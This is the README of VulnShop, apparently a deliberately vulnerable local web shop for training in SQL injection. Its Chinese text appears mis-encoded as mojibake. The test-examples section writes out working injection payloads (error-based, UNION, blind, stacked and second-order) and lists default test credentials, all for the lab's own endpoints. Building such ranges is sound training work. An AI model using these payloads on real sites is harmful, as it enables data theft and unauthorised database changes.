# VulnShop - SQL æ³¨å…¥æµ‹è¯•é¶åœº

```
â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ•—     â–ˆâ–ˆâ–ˆâ•—   â–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•—  â–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•— 
â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ–ˆâ–ˆâ•—  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â•â•â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â–ˆâ–ˆâ•—â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•—
â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•”â–ˆâ–ˆâ•— â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•
â•šâ–ˆâ–ˆâ•— â–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘     â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘â•šâ•â•â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘   â–ˆâ–ˆâ•‘â–ˆâ–ˆâ•”â•â•â•â• 
 â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•”â• â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•—â–ˆâ–ˆâ•‘ â•šâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•‘â–ˆâ–ˆâ•‘  â–ˆâ–ˆâ•‘â•šâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ•”â•â–ˆâ–ˆâ•‘     
  â•šâ•â•â•â•   â•šâ•â•â•â•â•â• â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â•â•â•â•šâ•â•â•â•â•â•â•â•šâ•â•  â•šâ•â• â•šâ•â•â•â•â•â• â•šâ•â•     
```

**ä¸€ä¸ªä¸“é—¨ç”¨äº SQL æ³¨å…¥æµ‹è¯•å’Œå­¦ä¹ çš„æ¼æ´é¶åœº**

> âš ï¸ **è­¦å‘Š**: æ­¤ç³»ç»Ÿä»…ä¾›å®‰å…¨æµ‹è¯•å’Œæ•™è‚²ç›®çš„ä½¿ç”¨ï¼ç¦æ­¢ç”¨äºéæ³•ç”¨é€”ï¼

## ğŸ“– ç®€ä»‹

VulnShop æ˜¯ä¸€ä¸ªæ¨¡æ‹Ÿçº¿ä¸Šå•†åº—çš„ SQL æ³¨å…¥æµ‹è¯•é¶åœºï¼Œä¸“é—¨è®¾è®¡ç”¨äºï¼š

- ğŸ“ **å­¦ä¹  SQL æ³¨å…¥**: äº†è§£å„ç§ SQL æ³¨å…¥ç±»å‹çš„åŸç†å’Œåˆ©ç”¨æ–¹å¼
- ğŸ”§ **æµ‹è¯•å®‰å…¨å·¥å…·**: æµ‹è¯• SQLMapã€Burp Suite ç­‰å®‰å…¨å·¥å…·çš„åŠŸèƒ½
- ğŸ“ **å®‰å…¨åŸ¹è®­**: ä½œä¸ºå®‰å…¨åŸ¹è®­å’Œ CTF æ¯”èµ›çš„ç»ƒä¹ ç¯å¢ƒ

## âœ¨ ç‰¹æ€§

### ç°ä»£åŒ– UI
- ğŸ¨ å“åº”å¼è®¾è®¡ï¼Œé€‚é…å„ç§å±å¹•
- ğŸŒ“ æ”¯æŒäº®è‰²/æš—è‰²ä¸»é¢˜åˆ‡æ¢
- ğŸ›’ å®Œæ•´çš„ç”µå•†è´­ç‰©æµç¨‹æ¨¡æ‹Ÿ

### æ”¯æŒçš„ SQL æ³¨å…¥ç±»å‹

| ç±»å‹ | æ¥å£ | è¯´æ˜ |
|------|------|------|
| **Error-based** | POST /api/user/login | åŸºäºé”™è¯¯çš„æ³¨å…¥ï¼Œè¿”å›è¯¦ç»† SQL é”™è¯¯ä¿¡æ¯ |
| **Union-based** | GET /api/user/profile | è”åˆæŸ¥è¯¢æ³¨å…¥ï¼Œå¯æå–å…¶ä»–è¡¨æ•°æ® |
| **Boolean-blind** | GET /api/products/search | å¸ƒå°”ç›²æ³¨ï¼Œé€šè¿‡å“åº”å·®å¼‚åˆ¤æ–­ |
| **Time-based** | GET /api/products/detail | æ—¶é—´ç›²æ³¨ï¼Œé€šè¿‡å“åº”æ—¶é—´åˆ¤æ–­ |
| **Stacked Queries** | GET /api/orders/query | å †å æŸ¥è¯¢ï¼Œå¯æ‰§è¡Œå¤šæ¡ SQL è¯­å¥ |
| **Second-order** | POST /api/user/register | äºŒæ¬¡æ³¨å…¥ï¼Œå­˜å‚¨ååœ¨å…¶ä»–ä½ç½®è§¦å‘ |

### WAF éš¾åº¦çº§åˆ«

| çº§åˆ« | é˜²æŠ¤æªæ–½ | ç»•è¿‡éš¾åº¦ |
|------|----------|----------|
| **Easy** | æ— ä»»ä½•é˜²æŠ¤ | ç›´æ¥æ³¨å…¥ |
| **Medium** | ç®€å•å…³é”®å­—è¿‡æ»¤ | å¤§å°å†™æ··åˆã€URL ç¼–ç  |
| **Hard** | ä¸¥æ ¼ WAF è¿‡æ»¤ | é«˜çº§ç»•è¿‡æŠ€æœ¯ |

### æŠ€æœ¯æ ˆ

- **åç«¯**: Python 3 + Flask
- **æ•°æ®åº“**: SQLite3
- **å‰ç«¯**: çº¯ HTML + CSS + JavaScript
- **æ— éœ€å¤–éƒ¨ä¾èµ–**ï¼Œå¼€ç®±å³ç”¨

## ğŸš€ å¿«é€Ÿå¼€å§‹

### ç¯å¢ƒè¦æ±‚

- Python 3.7+
- Flask (`pip install flask`)
- ä»…æ”¯æŒæœ¬åœ°è®¿é—®ï¼ˆ127.0.0.1ï¼‰

### å¯åŠ¨æœåŠ¡

```bash
cd src/vulnTestServer

# å®‰è£…ä¾èµ–
pip install flask

# å¯åŠ¨æœåŠ¡
python server.py
```

æœåŠ¡å°†åœ¨ http://127.0.0.1:9527 å¯åŠ¨ã€‚

### è®¿é—®é¶åœº

1. æ‰“å¼€æµè§ˆå™¨è®¿é—® http://127.0.0.1:9527
2. ä½¿ç”¨æµ‹è¯•è´¦æˆ·ç™»å½•

## ğŸ‘¥ æµ‹è¯•è´¦æˆ·

| ç”¨æˆ·å | å¯†ç  | è§’è‰² |
|--------|------|------|
| admin | admin123 | ç®¡ç†å‘˜ |
| test | test | æ™®é€šç”¨æˆ· |
| alice | alice123 | æ™®é€šç”¨æˆ· |
| bob | bob456 | æ™®é€šç”¨æˆ· |

## ğŸ¯ æµ‹è¯•ç¤ºä¾‹

### Error-based æ³¨å…¥

```http
POST /api/user/login
Content-Type: application/json

{
  "username": "admin' AND 1=CAST((SELECT password FROM users WHERE username='admin') AS int)--",
  "password": "x"
}
```

### Union-based æ³¨å…¥

```http
GET /api/user/profile?id=1 UNION SELECT 1,flag,description,4,5,6 FROM secrets--
```

### Boolean-blind ç›²æ³¨

```http
GET /api/products/search?keyword=test' AND (SELECT SUBSTR(password,1,1) FROM users WHERE username='admin')='a'--
```

### Time-based ç›²æ³¨

```http
GET /api/products/detail?id=1 AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE 1 END)
```

### Stacked Queries

```http
GET /api/orders/query?order_no=ORD001'; INSERT INTO users(username,password,email) VALUES('hacker','pwned','h@h.com');--
```

### Second-order æ³¨å…¥

```http
POST /api/user/register
Content-Type: application/json

{
  "username": "admin'--",
  "password": "test",
  "email": "test@test.com"
}
```

## ğŸ› ï¸ é…ç½®

### ä¿®æ”¹ç«¯å£

ç¼–è¾‘ `config.py`:

```python
HOST = "127.0.0.1"  # ä»…å…è®¸æœ¬åœ°è®¿é—®
PORT = 9527         # ä¿®æ”¹æ­¤å¤„æ›´æ”¹ç«¯å£
```

### åˆ‡æ¢éš¾åº¦

1. **Web ç•Œé¢**: è®¿é—®ã€Œç³»ç»Ÿé…ç½®ã€é¡µé¢
2. **API**: `POST /api/config` å‘é€ `{"difficulty": "medium"}`
3. **é…ç½®æ–‡ä»¶**: ç¼–è¾‘ `config.py` ä¸­çš„ `DIFFICULTY`

### é‡ç½®æ•°æ®åº“

1. **Web ç•Œé¢**: è®¿é—®ã€Œç³»ç»Ÿé…ç½®ã€é¡µé¢ç‚¹å‡»ã€Œé‡ç½®æ•°æ®åº“ã€
2. **å‘½ä»¤è¡Œ**: `python database.py`

## ğŸ“Š æ•°æ®åº“ç»“æ„

### users è¡¨
| å­—æ®µ | ç±»å‹ | è¯´æ˜ |
|------|------|------|
| id | INTEGER | ä¸»é”® |
| username | TEXT | ç”¨æˆ·å |
| password | TEXT | å¯†ç  |
| email | TEXT | é‚®ç®± |
| phone | TEXT | ç”µè¯ |
| address | TEXT | åœ°å€ |
| balance | REAL | ä½™é¢ |
| is_admin | INTEGER | æ˜¯å¦ç®¡ç†å‘˜ |
| created_at | TEXT | åˆ›å»ºæ—¶é—´ |

### products è¡¨
| å­—æ®µ | ç±»å‹ | è¯´æ˜ |
|------|------|------|
| id | INTEGER | ä¸»é”® |
| name | TEXT | å•†å“åç§° |
| description | TEXT | å•†å“æè¿° |
| price | REAL | ä»·æ ¼ |
| stock | INTEGER | åº“å­˜ |
| category | TEXT | åˆ†ç±» |
| image | TEXT | å›¾ç‰‡ |
| is_active | INTEGER | æ˜¯å¦ä¸Šæ¶ |
| created_at | TEXT | åˆ›å»ºæ—¶é—´ |

### orders è¡¨
| å­—æ®µ | ç±»å‹ | è¯´æ˜ |
|------|------|------|
| id | INTEGER | ä¸»é”® |
| user_id | INTEGER | ç”¨æˆ·ID |
| product_id | INTEGER | å•†å“ID |
| quantity | INTEGER | æ•°é‡ |
| total_price | REAL | æ€»ä»· |
| status | TEXT | è®¢å•çŠ¶æ€ |
| shipping_address | TEXT | æ”¶è´§åœ°å€ |
| order_no | TEXT | è®¢å•å· |
| created_at | TEXT | åˆ›å»ºæ—¶é—´ |

### secrets è¡¨ (CTF Flag)
| å­—æ®µ | ç±»å‹ | è¯´æ˜ |
|------|------|------|
| id | INTEGER | ä¸»é”® |
| flag | TEXT | CTF Flag |
| description | TEXT | æè¿° |
| created_at | TEXT | åˆ›å»ºæ—¶é—´ |

## ğŸ“ é¡¹ç›®ç»“æ„

```
vulnTestServer/
â”œâ”€â”€ server.py         # HTTP æœåŠ¡å™¨ä¸»ç¨‹åº
â”œâ”€â”€ database.py       # æ•°æ®åº“ç®¡ç†ï¼ˆåˆå§‹åŒ–/é‡ç½®ï¼‰
â”œâ”€â”€ waf.py            # WAF æ¨¡å—ï¼ˆéš¾åº¦æ§åˆ¶ï¼‰
â”œâ”€â”€ config.py         # é…ç½®æ–‡ä»¶
â”œâ”€â”€ static/           # å‰ç«¯é™æ€èµ„æº
â”‚   â”œâ”€â”€ index.html    # å•é¡µåº”ç”¨å…¥å£
â”‚   â”œâ”€â”€ css/
â”‚   â”‚   â””â”€â”€ style.css # æ ·å¼è¡¨ï¼ˆæ”¯æŒä¸»é¢˜ï¼‰
â”‚   â””â”€â”€ js/
â”‚       â””â”€â”€ app.js    # å‰ç«¯ JavaScript
â”œâ”€â”€ doc/
â”‚   â”œâ”€â”€ USAGE.md      # è¯¦ç»†ä½¿ç”¨è¯´æ˜
â”‚   â””â”€â”€ DISCLAIMER.md # å…è´£å£°æ˜
â””â”€â”€ README.md
```

## âš ï¸ å®‰å…¨é¡»çŸ¥

1. **ä»…åœ¨æœ¬åœ°ä½¿ç”¨**: æœåŠ¡ä»…ç»‘å®š 127.0.0.1ï¼Œç¦æ­¢æš´éœ²åˆ°å…¬ç½‘
2. **æµ‹è¯•ç¯å¢ƒéš”ç¦»**: ä¸è¦åœ¨ç”Ÿäº§ç¯å¢ƒæˆ–é‡è¦ç³»ç»Ÿä¸Šè¿è¡Œ
3. **åˆæ³•ä½¿ç”¨**: ä»…ç”¨äºæˆæƒçš„å®‰å…¨æµ‹è¯•å’Œå­¦ä¹ ç›®çš„
4. **åŠæ—¶å…³é—­**: ä¸ä½¿ç”¨æ—¶è¯·å…³é—­æœåŠ¡

## ğŸ“š è¯¦ç»†æ–‡æ¡£

- [ä½¿ç”¨è¯´æ˜](doc/USAGE.md) - è¯¦ç»†çš„ä½¿ç”¨æŒ‡å—å’Œæµ‹è¯•æ–¹æ³•
- [å…è´£å£°æ˜](doc/DISCLAIMER.md) - æ³•å¾‹å£°æ˜å’Œä½¿ç”¨æ¡æ¬¾

## ğŸ“ è®¸å¯è¯

æ­¤é¡¹ç›®ä»…ä¾›æ•™è‚²å’Œå®‰å…¨ç ”ç©¶ç›®çš„ä½¿ç”¨ã€‚ä½¿ç”¨å‰è¯·é˜…è¯»[å…è´£å£°æ˜](doc/DISCLAIMER.md)ã€‚

---

**VulnShop** - å®‰å…¨å­¦ä¹ ï¼Œä»å®è·µå¼€å§‹ ğŸ›¡ï¸
